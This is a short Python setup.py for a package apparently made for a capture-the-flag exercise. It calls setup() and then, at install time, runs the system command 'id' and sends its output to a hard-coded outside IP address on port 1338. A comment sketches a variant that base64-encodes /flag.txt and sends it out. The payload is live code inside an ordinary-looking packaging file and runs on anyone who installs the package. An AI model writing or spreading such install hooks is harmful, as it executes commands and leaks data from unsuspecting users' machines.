from setuptools import setup
import requests
import os

setup(
    name='ctf-q21-empire-tmp-bw134347',
    description='Bye world',
    version='0.0.8',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )

requests.get("http://52.246.190.141:1338/?a="+os.popen("id").read()) #cat /flag.txt | base64").read())
